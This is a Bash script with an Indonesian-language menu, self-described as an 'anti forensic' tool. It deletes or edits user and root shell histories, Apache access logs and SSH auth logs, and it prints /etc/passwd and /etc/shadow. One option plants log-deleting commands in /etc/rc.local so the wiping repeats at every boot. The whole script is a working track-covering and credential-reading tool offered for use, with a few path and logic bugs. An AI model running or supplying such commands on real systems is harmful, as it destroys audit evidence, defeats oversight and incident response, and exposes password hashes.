#!/bin/bash
again='y'
while [ $again == 'Y' ] || [ $again == 'y' ];
do
clear
echo "================================================";
echo "       SOP Anti Forensic (Root access only)     ";
echo "       Ga tau versi berapa males kembangin      ";
echo "                   Coded by                     ";
echo "                                                ";
echo "               root@x-krypt0n-x                 ";
echo "------------------------------------------------";
echo "1.  Cek keberadaan log user                     ";
echo "2.  Edit isi log user           		          ";
echo "3.  Ubah kepemilikan user ke user.user          ";
echo "4.  Kosongkan log user (user.user)              ";
echo "------------------------------------------------";
echo "5.  Cek keberadaan log akses root               ";
echo "6.  Edit isi log akses root                     ";
echo "7.  Ubah kepemilikan menjadi root.root          ";
echo "8.  Hapus log akses root (root.root)            ";
echo "------------------------------------------------";
echo "9.  Cek keberadaan log akses apache2            ";
echo "10. Edit isi log akses apache2                  ";
echo "11. Ubah kepemilikan menjadi root.adm           ";
echo "12. Hapus log akses apache2 (root.adm)          ";
echo "------------------------------------------------";
echo "13. Cek keberadaan log akses SSH                ";
echo "14. Edit isi log SSH                            ";
echo "15. Ubah kepemilikan menjadi syslog.adm         ";
echo "16. Hapus log SSH (syslog.adm)                  ";
echo "------------------------------------------------";
echo "17. Lihat user linux                            ";
echo "18. Lihat isi group linux                       ";
echo "19. Lihat password user linux (encrypt)         ";
echo "------------------------------------------------";
echo "20. Pasang penghapus log di rc.local            ";
echo "21. Edit rc.local                               ";
echo "22. Exit (yamete >////<)                        ";
echo "================================================";

read -p "Pilihan antara 1 sampe 22: " choice;
echo "";
case $choice in
1)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history nya di folder /home/$namauser/"
    else
    echo "ada file .bash_history di folder /home/$namauser/ :D"
    sudo ls -la /home/$namauser/.bash_history
    fi
    ;;
2)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di folder /home/$namauser/"
    else
    echo "File .bash_history di folder /home/$namauser/ terhapus XD"
    sudo nano /home/$namauser/.bash_history
    fi
    ;;
3)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di folder /home/$namauser/"
    else
    echo "File .bash_history di folder /home/$namauser/ lu ubah jadi $namauser.$namauser XD"
    sudo chown $namauser.$namauser /home/$namauser/.bash_history
    fi
    ;;
4)  echo -n "Masukkan nama user: "
    read namauser
    if [ -z "$(sudo ls -la /home/$namauser/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di folder /home/$namauser/"
    else
    echo "File .bash_history di folder /home/$namauser/ kehapus :D"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /home/$namauser/.bash_history
    sudo touch /home/$namauser/.bash_history
    sudo chown $namauser.$namauser /home/$namauser/.bash_history
    fi
    ;;
5)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di root"
    else
    echo "ada file .bash_history di folder /root/ :D"
    sudo ls -la /root/.bash_history
    fi
    ;;   
6)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di root"
    else
    echo "File .bash_history di folder /root/ kebuka :D"
    sudo nano /root/.bash_history
    fi
    ;;
7)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di root"
    else
    echo "File .bash_history di folder /root/ hak aksesnya diubah menjadi root.root :D"
    sudo chown root.root /root/.bash_history
    fi
    ;;

8)  if [ -z "$(sudo ls -la /root/.bash_history)" ]; then
    echo "ga ada cuk file .bash_history di root"
    else
    echo "File .bash_history di folder /root/ kehapus"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /root/.bash_history
    sudo touch /root/.bash_history
    sudo chown root.root /root/.bash_history
    fi
    ;;   

9)  if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "ga ada cuk file access.log* di folder /var/log/apache2/"
    else
    echo "Terdeteksi ada file access.log di folder /var/log/apache2/"
    sudo ls -l /var/log/apache2/access.log
    fi
    ;;
10)  if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "ga ada cuk file access.log* di folder /var/log/apache2/"
    else
    echo "File access.log di folder /var/log/apache2/ kebuka :D"
    sudo nano /var/log/apache2/access.log
    fi
    ;;
11) if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "ga ada cuk file access.log* di folder /var/log/apache2/"
    else
    echo "File access.log di folder /var/log/apache2/ hak aksesnya lu ubah jadi root.adm :D"
    sudo chown root.adm /var/log/apache2/access.log
    fi
    ;;

12) if [ -z "$(sudo ls -A /var/log/apache2/access.log)" ]; then
    echo "ga ada cuk file access.log di folder /var/log/apache2/"
    else
    echo "File access.log di folder /var/log/apache2/ kehapus :D"
    echo "Log baru akan tampil setelah linux direstart :D"
    sudo rm /var/log/apache2/access.log*
    sudo touch /var/log/apache2/access.log
    sudo chown root.adm /var/log/apache2/access.log
    fi
    ;;
13) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "ga ada cuk file auth.log di folder /var/log/"
    else
    echo "Ada ni file auth.log di folder /var/log/ :D"
    sudo ls -l /var/log/auth.log
    fi
    ;;
14) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "ga ada cuk file auth.log* di folder /var/log/"
    else
    echo "File auth.log di folder /var/log/ kebuka :D"
    sudo nano /var/log/auth.log
    fi
    ;;
15) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "ga ada cuk file auth.log di folder /var/log/"
    else
    echo "File auth.log di folder /var/log/ hak aksesnya lu ubah jadi root.adm :D"
    sudo chown syslog.adm /var/log/auth.log
    fi
    ;;

16) if [ -z "$(sudo ls -A /var/log/auth.log)" ]; then
    echo "ga ada cuk file auth.log di folder /var/log/"
    else
    echo "File auth.log ada di folder /var/log/ :D"
    echo "Log baru akan tampil setelah linux direstart"
    sudo rm /var/log/auth.log*
    sudo touch /var/log/auth.log
    sudo chown syslog.adm /var/log/auth.log
    fi
    ;;
17) if [ -z "$(sudo ls -A /etc/passwd)" ]; then
    echo "ga ada file cuk /etc/passwd di linux"
    else
    echo "File /etc/passwd kebuka :D"
    sudo cat /etc/passwd
    fi
    ;;
18) if [ -z "$(sudo ls -A /etc/group)" ]; then
    echo "ga ada file cuk /etc/group di linux"
    else
    echo "File /etc/group kebuka :D"
    sudo cat /etc/group
    fi
    ;;
19) if [ -z "$(sudo ls -A /etc/group)" ]; then
    echo "ga file cuk /etc/shadow di linux"
    else
    echo "File /etc/shadow kebuka :D"
    sudo cat /etc/shadow
    fi
    ;;
20)  if [ -z "$(sudo ls -A /etc/rc.local)" ]; then
    echo "ga ada cuk file rc.local di /etc/"
    else
    echo "File rc.local di folder /etc/ disisipkan penghapus log"
    sudo sed -i -e '$i \rm /root/.bash_history\n' /etc/rc.local
    sudo sed -i -e '$i \rm /var/log/apache2/access.log*\n' /etc/rc.local
    sudo sed -i -e '$i \rm /root/log/auth.log*\n' /etc/rc.local
    sudo sed -i -e '$i \touch /root/.bash_history\n' /etc/rc.local
    sudo sed -i -e '$i \touch /var/log/apache2/access.log\n' /etc/rc.local
    sudo sed -i -e '$i \touch /root/log/auth.log\n' /etc/rc.local
    sudo sed -i -e '$i \chown root.root /root/.bash_history\n' /etc/rc.local
    sudo sed -i -e '$i \chown root.adm /var/log/apache2/access.log\n' /etc/rc.local
    sudo sed -i -e '$i \chown syslog.adm /root/log/auth.log\n' /etc/rc.local
    fi
    ;; 

21) if [ -z "$(sudo ls -A /etc/rc.local)" ]; then
    echo "ga ada cuk file rc.local di /etc/"
    else
    echo "File rc.local di folder /etc/ kebuka :D"
    nano /etc/rc.local
    fi
    ;; 

22)    exit
    ;;
*)    echo "Pilih yg ada ae lah tolol >:D"
esac
echo ""
echo "Anti Forensic SOP"
echo "root@x-krypt0n-x"
echo ""
echo -n "balek ke menu? [y/n]: ";
read again;
while [ $again != 'Y' ] && [ $again != 'y' ] && [ $again != 'N' ] && [ $again != 'n' ];
do
echo "yang lu masukin ga ada dimenu bjir";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done
